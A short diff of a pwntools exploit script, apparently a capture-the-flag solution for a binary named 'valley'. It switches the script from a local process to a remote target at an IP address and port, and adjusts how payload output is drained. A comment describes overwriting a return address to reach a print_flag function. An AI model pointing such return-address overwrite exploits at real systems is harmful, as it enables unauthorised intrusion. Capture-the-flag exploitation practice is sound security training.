@@ -1,7 +1,7 @@
 from pwn import *
 
 # Start the valley process
-process = process('./valley')
+process = remote('128.237.152.18', 49174)
 # Clear out the welcome message
 response = process.recvline()
 
@@ -34,9 +34,12 @@ process.sendline(payload)
 
 # Clear out junk response from the payload
 while True:
-    response = process.recvrepeat(0)
-    if response == b'':
-        break
+    try:
+        response = process.recvrepeat(1)
+        if response == b'':
+            break
+    except:
+        pass
 
 
 # exit from echo_valley() to redirect to the overwritten return address (print_flag)
